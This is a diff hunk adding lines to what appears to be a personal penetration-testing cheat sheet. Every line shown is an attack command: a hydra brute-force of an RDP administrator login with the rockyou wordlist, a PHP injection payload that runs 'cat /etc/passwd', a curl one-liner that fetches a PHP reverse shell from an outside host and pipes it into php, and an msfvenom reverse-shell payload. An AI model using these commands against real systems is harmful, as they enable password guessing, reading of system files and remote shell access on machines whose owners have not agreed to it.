@@ -2878,6 +2878,14 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 
 
 ```
+
+# Escaping PHP Filters (LFI)
+
+	page=' and die(system('cat /etc/passwd')) or '
+
+ 	# Downloading php reverse shell and executing server-side
+        curl http://192.168.45.80/php-reverse-shell.php|php
+
 # MSFVENOM
 
 	Linux reverse shell: msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell.exe LHOST=192.168.45.246 LPORT=445
